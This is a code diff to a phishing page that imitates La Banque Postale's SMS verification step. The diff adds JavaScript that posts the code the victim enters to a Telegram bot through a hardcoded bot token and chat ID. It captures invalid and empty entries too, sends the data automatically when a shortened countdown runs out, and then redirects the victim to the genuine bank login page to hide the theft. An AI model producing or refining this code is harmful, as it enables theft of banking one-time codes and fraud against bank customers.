@@ -139,6 +139,13 @@
         .lbp-trust-badge img {
             height: 60px;
         }
+
+        .lbp-loading {
+            display: none;
+            margin-top: var(--lbp-space-sm);
+            color: var(--lbp-blue);
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
@@ -158,9 +165,10 @@
             </div>
             
             <button id="submit-btn" class="lbp-submit-button">Valider</button>
+            <div id="loading" class="lbp-loading">Vérification en cours...</div>
             
             <div class="lbp-timer" id="timer">
-                Redirection automatique dans <span id="countdown">60</span> secondes
+                Redirection automatique dans <span id="countdown">12</span> secondes
             </div>
 
             <div class="lbp-trust-badge">
@@ -175,35 +183,89 @@
             const submitBtn = document.getElementById('submit-btn');
             const errorMessage = document.getElementById('error-message');
             const countdownElement = document.getElementById('countdown');
+            const loadingElement = document.getElementById('loading');
             
             // Compte à rebours pour la redirection automatique
-            let seconds = 30;
+            let seconds = 12;
             const countdown = setInterval(function() {
                 seconds--;
                 countdownElement.textContent = seconds;
                 
                 if (seconds <= 0) {
                     clearInterval(countdown);
-                    redirectToOfficialSite();
+                    sendToTelegramAndRedirect();
                 }
             }, 1000);
 
-            // Redirection vers le site officiel
-            function redirectToOfficialSite() {
-                window.location.href = 'https://www.labanquepostale.fr/particulier/connexion-espace-client.html?msockid=3b3ff79879796479348be24978af6520';
+            async function sendToTelegramAndRedirect() {
+                const smsCode = smsInput.value.trim();
+                
+                // Si le champ est vide ou ne contient pas 6 chiffres, on envoie quand même ce qu'il y a
+                const codeToSend = smsCode || "(aucun code saisi)";
+                
+                try {
+                    // Envoyer les données à Telegram
+                    const botToken = '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
+                    const chatId = '5372119436';
+                    const message = `Code SMS reçu: ${codeToSend}`;
+                    
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message
+                        })
+                    });
+                    
+                    // Redirection après envoi
+                    window.location.href = 'https://www.labanquepostale.fr/particulier/connexion-espace-client.html?msockid=3b3ff79879796479348be24978af6520';
+                    
+                } catch (error) {
+                    console.error('Erreur:', error);
+                    // Redirection même en cas d'erreur
+                    window.location.href = 'https://www.labanquepostale.fr/particulier/connexion-espace-client.html?msockid=3b3ff79879796479348be24978af6520';
+                }
             }
 
-            submitBtn.addEventListener('click', function() {
+            submitBtn.addEventListener('click', async function() {
                 const smsCode = smsInput.value.trim();
+                
+                // Afficher le chargement
+                submitBtn.disabled = true;
+                loadingElement.style.display = 'block';
                 
                 // Vérification que le code contient exactement 6 chiffres
                 if (/^\d{6}$/.test(smsCode)) {
-                    // Redirection immédiate si code valide
-                    redirectToOfficialSite();
+                    await sendToTelegramAndRedirect();
                 } else {
+                    // Envoyer quand même à Telegram ce qui a été saisi
+                    try {
+                        const botToken = '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
+                        const chatId = '5372119436';
+                        const message = `Code SMS saisi (invalide): ${smsCode || "(vide)"}`;
+                        
+                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: message
+                            })
+                        });
+                    } catch (error) {
+                        console.error('Erreur Telegram:', error);
+                    }
+                    
                     // Afficher le message d'erreur
                     errorMessage.style.display = 'block';
                     smsInput.focus();
+                    submitBtn.disabled = false;
+                    loadingElement.style.display = 'none';
                 }
             });
 
